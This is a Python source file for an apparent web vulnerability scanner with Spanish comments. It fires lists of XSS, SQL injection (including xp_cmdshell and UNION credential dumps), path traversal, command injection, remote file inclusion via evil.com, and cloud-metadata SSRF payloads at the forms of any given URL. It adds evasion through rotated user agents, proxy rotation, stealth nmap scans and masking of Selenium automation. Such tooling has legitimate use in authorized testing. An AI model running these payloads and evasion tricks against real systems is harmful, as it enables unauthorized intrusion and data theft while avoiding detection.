#!/usr/bin/env python3
"""
Web Vulnerability Scanner Avanzado - ToolKit de Seguridad
Autor: DamiSty Design
Versión: 2.0
Propósito: Herramienta educativa para pruebas de penetración autorizadas
"""

import os
import sys
import time
import json
import random
import socket
import threading
import subprocess
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
from enum import Enum

# Módulos principales
import requests
from flask import Flask, request, jsonify, render_template
from bs4 import BeautifulSoup
import nmap
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# Configuración de user-agents para evasión
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
]

class ScanMode(Enum):
    """Modos de escaneo disponibles"""
    STEALTH = "stealth"
    AGGRESSIVE = "aggressive"
    COMPREHENSIVE = "comprehensive"

@dataclass
class ScanResult:
    """Estructura para resultados de escaneo"""
    url: str
    vulnerability_type: str
    severity: str
    description: str
    payload: Optional[str] = None
    confidence: float = 0.0
    timestamp: str = datetime.now().isoformat()

class AdvancedWebScanner:
    """Clase principal del escáner web avanzado"""
    
    def __init__(self, mode: ScanMode = ScanMode.STEALTH):
        self.mode = mode
        self.results = []
        self.session = self._create_session()
        self.nm = nmap.PortScanner()
        self.proxies = self._load_proxies()
        self.lock = threading.Lock()
        
    def _create_session(self) -> requests.Session:
        """Crea una sesión HTTP con configuración de evasión"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        if self.mode == ScanMode.STEALTH:
            session.headers.update({
                'DNT': '1',
                'Sec-GPC': '1'
            })
            # Delay aleatorio entre requests
            time.sleep(random.uniform(1, 3))
            
        return session
    
    def _load_proxies(self) -> List[str]:
        """Carga proxies para rotación de IP"""
        proxies = []
        try:
            # Lista de proxies gratuitos (actualizar regularmente)
            proxies = [
                "http://proxy1.example.com:8080",
                "http://proxy2.example.com:8080",
            ]
        except:
            pass
        return proxies
    
    def _get_random_proxy(self) -> Dict:
        """Obtiene un proxy aleatorio"""
        if self.proxies and self.mode == ScanMode.STEALTH:
            proxy = random.choice(self.proxies)
            return {"http": proxy, "https": proxy}
        return {}
    
    def scan_url(self, url: str) -> List[ScanResult]:
        """Escanea una URL para múltiples vulnerabilidades"""
        print(f"[*] Iniciando escaneo de: {url}")
        
        # Validar URL
        if not self._validate_url(url):
            return []
        
        # Lista de funciones de escaneo
        scan_functions = [
            self.scan_xss,
            self.scan_sqli,
            self.scan_directory_traversal,
            self.scan_command_injection,
            self.scan_file_inclusion,
            self.scan_ssrf,
            self.scan_open_redirect,
            self.scan_csrf,
            self.scan_info_disclosure,
            self.scan_headers_security,
            self.scan_cors_misconfig,
            self.scan_jwt_vulnerabilities
        ]
        
        # Ejecutar escaneos en paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(func, url) for func in scan_functions]
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        with self.lock:
                            self.results.extend(result)
                except Exception as e:
                    print(f"[-] Error en escaneo: {e}")
        
        return self.results
    
    def scan_xss(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades XSS"""
        print(f"[*] Escaneando XSS en: {url}")
        results = []
        
        # Payloads XSS avanzados
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<input type=\"text\" value=\"\" onfocus=alert('XSS') autofocus>"
        ]
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Buscar formularios
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # Encontrar inputs
                inputs = form.find_all('input')
                for payload in xss_payloads:
                    data = {}
                    for input_tag in inputs:
                        name = input_tag.get('name')
                        if name:
                            data[name] = payload
                    
                    # Enviar payload
                    if method == 'get':
                        target_url = urljoin(url, action)
                        test_response = self.session.get(target_url, params=data, 
                                                       proxies=self._get_random_proxy())
                    else:
                        target_url = urljoin(url, action)
                        test_response = self.session.post(target_url, data=data, 
                                                        proxies=self._get_random_proxy())
                    
                    # Verificar si el payload fue reflejado
                    if payload in test_response.text:
                        results.append(ScanResult(
                            url=target_url,
                            vulnerability_type="Cross-Site Scripting (XSS)",
                            severity="High",
                            description="Vulnerabilidad XSS detectada",
                            payload=payload,
                            confidence=0.9
                        ))
        
        except Exception as e:
            print(f"[-] Error en escaneo XSS: {e}")
        
        return results
    
    def scan_sqli(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades SQL Injection"""
        print(f"[*] Escaneando SQL Injection en: {url}")
        results = []
        
        # Payloads SQLi avanzados
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, @@version)--",
            "'; EXEC xp_cmdshell('dir')--",
            "' UNION SELECT username, password FROM users--",
            "' OR EXISTS(SELECT * FROM information_schema.tables)--",
            "' AND SLEEP(5)--"
        ]
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                inputs = form.find_all('input')
                for payload in sqli_payloads:
                    data = {}
                    for input_tag in inputs:
                        name = input_tag.get('name')
                        if name:
                            data[name] = payload
                    
                    # Medir tiempo de respuesta para inyecciones basadas en tiempo
                    start_time = time.time()
                    
                    if method == 'get':
                        target_url = urljoin(url, action)
                        test_response = self.session.get(target_url, params=data,
                                                       proxies=self._get_random_proxy(),
                                                       timeout=10)
                    else:
                        target_url = urljoin(url, action)
                        test_response = self.session.post(target_url, data=data,
                                                        proxies=self._get_random_proxy(),
                                                        timeout=10)
                    
                    response_time = time.time() - start_time
                    
                    # Detección basada en errores
                    error_indicators = [
                        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                        "SQLite", "Microsoft Access", "SQL Server",
                        "unclosed quotation", "syntax error"
                    ]
                    
                    if any(error in test_response.text for error in error_indicators):
                        results.append(ScanResult(
                            url=target_url,
                            vulnerability_type="SQL Injection",
                            severity="Critical",
                            description="Posible vulnerabilidad SQL Injection detectada",
                            payload=payload,
                            confidence=0.85
                        ))
                    
                    # Detección basada en tiempo
                    elif response_time > 5:  # Si la respuesta tarda más de 5 segundos
                        results.append(ScanResult(
                            url=target_url,
                            vulnerability_type="SQL Injection (Time-based)",
                            severity="High",
                            description="Posible SQL Injection basado en tiempo",
                            payload=payload,
                            confidence=0.7
                        ))
        
        except Exception as e:
            print(f"[-] Error en escaneo SQLi: {e}")
        
        return results
    
    def scan_directory_traversal(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades de Directory Traversal"""
        print(f"[*] Escaneando Directory Traversal en: {url}")
        results = []
        
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd"
        ]
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        for payload in traversal_payloads:
            test_urls = [
                f"{base_url}/download?file={payload}",
                f"{base_url}/view?document={payload}",
                f"{base_url}/api/file?name={payload}",
                f"{base_url}/static/{payload}"
            ]
            
            for test_url in test_urls:
                try:
                    response = self.session.get(test_url, proxies=self._get_random_proxy(),
                                              timeout=5)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        indicators = ["root:x:", "[extensions]", "[fonts]",
                                    "[file]", "mysql", "database"]
                        
                        if any(indicator in content for indicator in indicators):
                            results.append(ScanResult(
                                url=test_url,
                                vulnerability_type="Directory Traversal / Path Traversal",
                                severity="High",
                                description="Posible vulnerabilidad de Directory Traversal",
                                payload=payload,
                                confidence=0.8
                            ))
                
                except:
                    continue
        
        return results
    
    def scan_command_injection(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades de Command Injection"""
        print(f"[*] Escaneando Command Injection en: {url}")
        results = []
        
        command_payloads = [
            "; ls -la",
            "| dir",
            "&& cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "|| ping -c 5 127.0.0.1"
        ]
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                for payload in command_payloads:
                    data = {}
                    for input_tag in inputs:
                        name = input_tag.get('name')
                        if name:
                            data[name] = f"test{payload}"
                    
                    start_time = time.time()
                    try:
                        if form.get('method', 'get').lower() == 'get':
                            test_response = self.session.get(url, params=data,
                                                          proxies=self._get_random_proxy(),
                                                          timeout=10)
                        else:
                            test_response = self.session.post(url, data=data,
                                                           proxies=self._get_random_proxy(),
                                                           timeout=10)
                    
                        response_time = time.time() - start_time
                        
                        # Detección basada en tiempo
                        if response_time > 4:
                            results.append(ScanResult(
                                url=url,
                                vulnerability_type="Command Injection",
                                severity="Critical",
                                description="Posible Command Injection detectado (time-based)",
                                payload=payload,
                                confidence=0.75
                            ))
                    
                    except requests.exceptions.Timeout:
                        results.append(ScanResult(
                            url=url,
                            vulnerability_type="Command Injection",
                            severity="Critical",
                            description="Timeout detectado - posible Command Injection",
                            payload=payload,
                            confidence=0.7
                        ))
        
        except Exception as e:
            print(f"[-] Error en escaneo Command Injection: {e}")
        
        return results
    
    def scan_file_inclusion(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades de File Inclusion (LFI/RFI)"""
        print(f"[*] Escaneando File Inclusion en: {url}")
        results = []
        
        inclusion_payloads = [
            "../../../../etc/passwd",
            "http://evil.com/shell.txt",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "expect://id"
        ]
        
        parsed_url = urlparse(url)
        params = {}
        
        if parsed_url.query:
            from urllib.parse import parse_qs
            params = parse_qs(parsed_url.query)
        
        for param_name, param_values in params.items():
            for payload in inclusion_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                
                try:
                    response = self.session.get(test_url, params=test_params,
                                              proxies=self._get_random_proxy())
                    
                    content = response.text.lower()
                    
                    if "root:x:" in content or "<?php" in content:
                        results.append(ScanResult(
                            url=test_url,
                            vulnerability_type="File Inclusion (LFI/RFI)",
                            severity="High",
                            description="Posible vulnerabilidad de File Inclusion",
                            payload=payload,
                            confidence=0.8
                        ))
                
                except Exception as e:
                    continue
        
        return results
    
    def scan_ssrf(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades SSRF"""
        print(f"[*] Escaneando SSRF en: {url}")
        results = []
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://[::1]:22",
            "file:///etc/passwd",
            "gopher://localhost:6379/_INFO"
        ]
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Buscar parámetros susceptibles
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                
                for payload in ssrf_payloads:
                    data = {}
                    for input_tag in inputs:
                        name = input_tag.get('name')
                        if name and any(keyword in name.lower() for keyword in 
                                      ['url', 'link', 'image', 'file', 'path']):
                            data[name] = payload
                    
                    if data:
                        try:
                            if form.get('method', 'get').lower() == 'get':
                                test_response = self.session.get(url, params=data,
                                                              proxies=self._get_random_proxy(),
                                                              timeout=5)
                            else:
                                test_response = self.session.post(url, data=data,
                                                               proxies=self._get_random_proxy(),
                                                               timeout=5)
                            
                            # Verificar si hay indicios de SSRF
                            if test_response.status_code == 200:
                                if any(indicator in test_response.text for indicator in 
                                      ['ec2', 'instance-id', 'ami-id', 'localhost']):
                                    results.append(ScanResult(
                                        url=url,
                                        vulnerability_type="Server-Side Request Forgery (SSRF)",
                                        severity="High",
                                        description="Posible vulnerabilidad SSRF detectada",
                                        payload=payload,
                                        confidence=0.7
                                    ))
                        
                        except:
                            continue
        
        except Exception as e:
            print(f"[-] Error en escaneo SSRF: {e}")
        
        return results
    
    def scan_open_redirect(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades de Open Redirect"""
        print(f"[*] Escaneando Open Redirect en: {url}")
        results = []
        
        redirect_payloads = [
            "http://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://google.com"
        ]
        
        parsed_url = urlparse(url)
        params = {}
        
        if parsed_url.query:
            from urllib.parse import parse_qs
            params = parse_qs(parsed_url.query)
        
        redirect_params = ['redirect', 'url', 'next', 'return', 'r', 'go', 'target']
        
        for param_name, param_values in params.items():
            if any(redirect in param_name.lower() for redirect in redirect_params):
                for payload in redirect_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    try:
                        response = self.session.get(test_url, params=test_params,
                                                  allow_redirects=False,
                                                  proxies=self._get_random_proxy())
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if payload in location:
                                results.append(ScanResult(
                                    url=test_url,
                                    vulnerability_type="Open Redirect",
                                    severity="Medium",
                                    description="Vulnerabilidad de Open Redirect detectada",
                                    payload=payload,
                                    confidence=0.9
                                ))
                    
                    except:
                        continue
        
        return results
    
    def scan_csrf(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades CSRF"""
        print(f"[*] Escaneando CSRF en: {url}")
        results = []
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                # Verificar tokens CSRF
                csrf_tokens = form.find_all('input', {'name': ['csrf', 'csrfmiddlewaretoken',
                                                              'authenticity_token', '_token']})
                
                if not csrf_tokens:
                    # Verificar si es una acción sensible
                    action = form.get('action', '').lower()
                    sensitive_actions = ['delete', 'update', 'modify', 'transfer',
                                       'changepassword', 'editprofile']
                    
                    if any(sensitive in action for sensitive in sensitive_actions):
                        results.append(ScanResult(
                            url=url,
                            vulnerability_type="Cross-Site Request Forgery (CSRF)",
                            severity="Medium",
                            description="Formulario sin token CSRF detectado",
                            confidence=0.8
                        ))
        
        except Exception as e:
            print(f"[-] Error en escaneo CSRF: {e}")
        
        return results
    
    def scan_info_disclosure(self, url: str) -> List[ScanResult]:
        """Escanea fugas de información"""
        print(f"[*] Escaneando Information Disclosure en: {url}")
        results = []
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            
            # Buscar información sensible en headers
            sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version',
                               'x-backend-server', 'x-runtime']
            
            for header in sensitive_headers:
                if header in response.headers:
                    results.append(ScanResult(
                        url=url,
                        vulnerability_type="Information Disclosure",
                        severity="Low",
                        description=f"Header {header} expuesto: {response.headers[header]}",
                        confidence=0.9
                    ))
            
            # Buscar en el contenido
            sensitive_patterns = [
                ('database password', 'Database password exposed'),
                ('api_key', 'API key exposed'),
                ('secret_key', 'Secret key exposed'),
                ('aws_access_key', 'AWS credentials exposed'),
                ('password', 'Password exposed'),
                ('sql', 'SQL query exposed'),
                ('stack trace', 'Stack trace exposed'),
                ('internal ip', 'Internal IP address exposed')
            ]
            
            content_lower = response.text.lower()
            
            for pattern, description in sensitive_patterns:
                if pattern in content_lower:
                    results.append(ScanResult(
                        url=url,
                        vulnerability_type="Information Disclosure",
                        severity="Medium",
                        description=description,
                        confidence=0.7
                    ))
        
        except Exception as e:
            print(f"[-] Error en escaneo Information Disclosure: {e}")
        
        return results
    
    def scan_headers_security(self, url: str) -> List[ScanResult]:
        """Escanea headers de seguridad"""
        print(f"[*] Escaneando Security Headers en: {url}")
        results = []
        
        try:
            response = self.session.get(url, proxies=self._get_random_proxy())
            headers = response.headers
            
            security_headers = {
                'Content-Security-Policy': 'Content Security Policy no implementada',
                'X-Frame-Options': 'Clickjacking protection no implementada',
                'X-Content-Type-Options': 'MIME sniffing protection no implementada',
                'Strict-Transport-Security': 'HSTS no implementado',
                'Referrer-Policy': 'Referrer Policy no configurada'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    results.append(ScanResult(
                        url=url,
                        vulnerability_type="Security Headers Missing",
                        severity="Low",
                        description=description,
                        confidence=0.9
                    ))
            
            # Verificar cookies seguras
            if 'set-cookie' in headers:
                cookies = headers['set-cookie'].lower()
                if 'secure' not in cookies:
                    results.append(ScanResult(
                        url=url,
                        vulnerability_type="Insecure Cookie",
                        severity="Medium",
                        description="Cookie sin flag Secure",
                        confidence=0.8
                    ))
                if 'httponly' not in cookies:
                    results.append(ScanResult(
                        url=url,
                        vulnerability_type="Cookie accessible via JavaScript",
                        severity="Low",
                        description="Cookie sin flag HttpOnly",
                        confidence=0.8
                    ))
        
        except Exception as e:
            print(f"[-] Error en escaneo Security Headers: {e}")
        
        return results
    
    def scan_cors_misconfig(self, url: str) -> List[ScanResult]:
        """Escanea configuraciones CORS incorrectas"""
        print(f"[*] Escaneando CORS Misconfiguration en: {url}")
        results = []
        
        try:
            # Enviar request con Origin header
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(url, headers=headers,
                                      proxies=self._get_random_proxy())
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' and acac.lower() == 'true':
                results.append(ScanResult(
                    url=url,
                    vulnerability_type="CORS Misconfiguration",
                    severity="Medium",
                    description="CORS configurado para permitir cualquier origen con credenciales",
                    confidence=0.9
                ))
            elif 'evil.com' in acao:
                results.append(ScanResult(
                    url=url,
                    vulnerability_type="CORS Misconfiguration",
                    severity="High",
                    description="CORS refleja el origen arbitrario",
                    confidence=0.9
                ))
        
        except Exception as e:
            print(f"[-] Error en escaneo CORS: {e}")
        
        return results
    
    def scan_jwt_vulnerabilities(self, url: str) -> List[ScanResult]:
        """Escanea vulnerabilidades en JWT tokens"""
        print(f"[*] Escaneando JWT Vulnerabilities en: {url}")
        results = []
        
        # Esta función requiere endpoints específicos de API
        # Se implementa como ejemplo básico
        
        return results
    
    def _validate_url(self, url: str) -> bool:
        """Valida que la URL sea correcta"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def port_scan(self, target: str, ports: str = "1-1000") -> Dict:
        """Escaneo de puertos con Nmap"""
        print(f"[*] Escaneando puertos en: {target}")
        
        try:
            # Configurar argumentos de Nmap basados en el modo
            if self.mode == ScanMode.STEALTH:
                arguments = f"-sS -T2 -p {ports} --script safe"
            elif self.mode == ScanMode.AGGRESSIVE:
                arguments = f"-sV -sC -p {ports} -T4"
            else:  # COMPREHENSIVE
                arguments = f"-sS -sV -sC -O -p- -T4"
            
            self.nm.scan(hosts=target, arguments=arguments)
            
            results = {}
            for host in self.nm.all_hosts():
                results[host] = {
                    'status': self.nm[host].state(),
                    'protocols': {}
                }
                
                for proto in self.nm[host].all_protocols():
                    ports_info = self.nm[host][proto]
                    results[host]['protocols'][proto] = {}
                    
                    for port, info in ports_info.items():
                        results[host]['protocols'][proto][port] = {
                            'state': info['state'],
                            'service': info.get('name', 'unknown'),
                            'version': info.get('version', ''),
                            'product': info.get('product', ''),
                            'scripts': info.get('script', {})
                        }
            
            return results
        
        except Exception as e:
            print(f"[-] Error en escaneo de puertos: {e}")
            return {}
    
    def selenium_analysis(self, url: str) -> List[ScanResult]:
        """Análisis usando Selenium para detección de vulnerabilidades del lado del cliente"""
        print(f"[*] Ejecutando análisis con Selenium en: {url}")
        results = []
        
        chrome_options = Options()
        chrome_options.add_argument('--headless')  # Ejecutar en background
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        
        # Configuraciones para evasión
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        
        driver = None
        
        try:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Modificar propiedades para evasión
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            driver.get(url)
            time.sleep(3)  # Esperar a que cargue la página
            
            # Buscar información sensible en localStorage y sessionStorage
            local_storage = driver.execute_script("return JSON.stringify(window.localStorage);")
            session_storage = driver.execute_script("return JSON.stringify(window.sessionStorage);")
            
            sensitive_keys = ['token', 'auth', 'session', 'secret', 'key', 'password']
            
            for storage, name in [(local_storage, 'localStorage'), (session_storage, 'sessionStorage')]:
                if storage and storage != '{}':
                    for key in sensitive_keys:
                        if key in storage.lower():
                            results.append(ScanResult(
                                url=url,
                                vulnerability_type="Client-Side Information Exposure",
                                severity="Medium",
                                description=f"Información sensible encontrada en {name}",
                                confidence=0.7
                            ))
            
            # Buscar endpoints de API expuestos en JavaScript
            page_source = driver.page_source
            api_patterns = ['/api/', '/graphql', '/rest/', '/v1/', '/v2/']
            
            for pattern in api_patterns:
                if pattern in page_source:
                    results.append(ScanResult(
                        url=url,
                        vulnerability_type="API Endpoint Exposure",
                        severity="Low",
                        description=f"Endpoint de API expuesto: {pattern}",
                        confidence=0.6
                    ))
            
            # Verificar formularios sin protección
            forms = driver.find_elements(By.TAG_NAME, 'form')
            for form in forms:
                try:
                    form_html = form.get_attribute('outerHTML')
                    if 'csrf' not in form_html.lower():
                        results.append(ScanResult(
                            url=url,
                            vulnerability_type="Potential CSRF Vulnerability",
                            severity="Medium",
                            description="Formulario sin protección CSRF visible",
                            confidence=0.5
                        ))
                except:
                    continue
        
        except Exception as e:
            print(f"[-] Error en análisis Selenium: {e}")
        
        finally:
            if driver:
                driver.quit()
        
        return results
    
    def save_report(self, filename: str = None) -> str:
        """Guarda el reporte en un archivo"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"scan_report_{timestamp}.json"
        
        report = {
            'scan_date': datetime.now().isoformat(),
            'mode': self.mode.value,
            'results': [r.__dict__ for r in self.results],
            'summary': {
                'total': len(self.results),
                'critical': len([r for r in self.results if r.severity == 'Critical']),
                'high': len([r for r in self.results if r.severity == 'High']),
                'medium': len([r for r in self.results if r.severity == 'Medium']),
                'low': len([r for r in self.results if r.severity == 'Low'])
            }
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Reporte guardado en: {filename}")
        return filename

class ScannerWebApp:
    """Interfaz web del escáner usando Flask"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.scanner = None
        self.setup_routes()
    
    def setup_routes(self):
        """Configura las rutas de la aplicación Flask"""
        
        @self.app.route('/')
        def index():
            return render_template('index.html')
        
        @self.app.route('/scan', methods=['POST'])
        def scan():
            data = request.json
            url = data.get('url')
            mode = data.get('mode', 'stealth')
            
            if not url:
                return jsonify({'error': 'URL requerida'}), 400
            
            # Crear scanner con el modo especificado
            scan_mode = ScanMode(mode)
            self.scanner = AdvancedWebScanner(mode=scan_mode)
            
            # Iniciar escaneo en un hilo separado
            thread = threading.Thread(
                target=self.scanner.scan_url,
                args=(url,)
            )
            thread.start()
            
            return jsonify({
                'message': 'Escaneo iniciado',
                'scan_id': id(self.scanner)
            })
        
        @self.app.route('/results/<scan_id>', methods=['GET'])
        def get_results(scan_id):
            if not self.scanner:
                return jsonify({'error': 'Scanner no inicializado'}), 404
            
            results = [r.__dict__ for r in self.scanner.results]
            
            return jsonify({
                'results': results,
                'total': len(results)
            })
        
        @self.app.route('/portscan', methods=['POST'])
        def port_scan():
            data = request.json
            target = data.get('target')
            ports = data.get('ports', '1-1000')
            
            if not target:
                return jsonify({'error': 'Target requerido'}), 400
            
            scanner = AdvancedWebScanner()
            results = scanner.port_scan(target, ports)
            
            return jsonify(results)
        
        @self.app.route('/report', methods=['POST'])
        def generate_report():
            if not self.scanner:
                return jsonify({'error': 'Scanner no inicializado'}), 404
            
            filename = self.scanner.save_report()
            
            return jsonify({
                'message': 'Reporte generado',
                'filename': filename
            })
    
    def run(self, host='0.0.0.0', port=5000, debug=False):
        """Inicia la aplicación web"""
        print(f"[*] Iniciando interfaz web en http://{host}:{port}")
        self.app.run(host=host, port=port, debug=debug)

def main():
    """Función principal"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Advanced Web Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ejemplos de uso:
  %(prog)s -u https://example.com
  %(prog)s -u https://example.com -m aggressive
  %(prog)s -t 192.168.1.1 -p 1-1000
  %(prog)s --web --port 8080
        '''
    )
    
    parser.add_argument('-u', '--url', help='URL a escanear')
    parser.add_argument('-t', '--target', help='Target para escaneo de puertos')
    parser.add_argument('-p', '--ports', default='1-1000', help='Rango de puertos (default: 1-1000)')
    parser.add_argument('-m', '--mode', choices=['stealth', 'aggressive', 'comprehensive'],
                       default='stealth', help='Modo de escaneo')
    parser.add_argument('--web', action='store_true', help='Iniciar interfaz web')
    parser.add_argument('--port', type=int, default=5000, help='Puerto para interfaz web')
    parser.add_argument('-o', '--output', help='Archivo de salida para el reporte')
    parser.add_argument('--selenium', action='store_true', help='Ejecutar análisis con Selenium')
    
    args = parser.parse_args()
    
    if args.web:
        # Modo interfaz web
        app = ScannerWebApp()
        app.run(port=args.port)
    
    elif args.url:
        # Modo línea de comandos - escaneo web
        scanner = AdvancedWebScanner(mode=ScanMode(args.mode))
        
        print(f"[*] Iniciando escaneo en modo {args.mode}")
        print(f"[*] Target: {args.url}")
        print("-" * 50)
        
        # Escaneo de vulnerabilidades web
        results = scanner.scan_url(args.url)
        
        # Análisis con Selenium si se solicita
        if args.selenium:
            selenium_results = scanner.selenium_analysis(args.url)
            results.extend(selenium_results)
        
        # Mostrar resultados
        print("\n" + "=" * 50)
        print("RESULTADOS DEL ESCANEO")
        print("=" * 50)
        
        for result in results:
            print(f"\n[+] {result.vulnerability_type}")
            print(f"    URL: {result.url}")
            print(f"    Severidad: {result.severity}")
            print(f"    Descripción: {result.description}")
            if result.payload:
                print(f"    Payload: {result.payload}")
            print(f"    Confianza: {result.confidence * 100}%")
        
        # Guardar reporte
        if args.output:
            scanner.save_report(args.output)
        else:
            scanner.save_report()
    
    elif args.target:
        # Modo línea de comandos - escaneo de puertos
        scanner = AdvancedWebScanner()
        results = scanner.port_scan(args.target, args.ports)
        
        print(f"\n[+] Resultados del escaneo de puertos para {args.target}:")
        for host, info in results.items():
            print(f"\nHost: {host} ({info['status']})")
            for proto, ports_info in info['protocols'].items():
                print(f"\nProtocolo: {proto}")
                for port, port_info in ports_info.items():
                    print(f"  Puerto {port}: {port_info['state']} - {port_info['service']} {port_info['version']}")
    
    else:
        parser.print_help()

if __name__ == "__main__":
    # Advertencia de uso ético
    print("=" * 70)
    print("ADVANCED WEB VULNERABILITY SCANNER - Versión 2.0")
    print("=" * 70)
    print("\nADVERTENCIA: Esta herramienta es solo para:")
    print("1. Pruebas de penetración autorizadas")
    print("2. Entornos de laboratorio controlados")
    print("3. Investigación de seguridad educativa")
    print("\nEl uso no autorizado es ilegal y no ético.")
    print("=" * 70 + "\n")
    
    # Verificar dependencias
    required_modules = ['flask', 'selenium', 'nmap', 'bs4', 'requests']
    missing = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"[-] Módulos faltantes: {', '.join(missing)}")
        print("[+] Instalar con: pip install flask selenium python-nmap beautifulsoup4 requests")
        sys.exit(1)
    

    main()
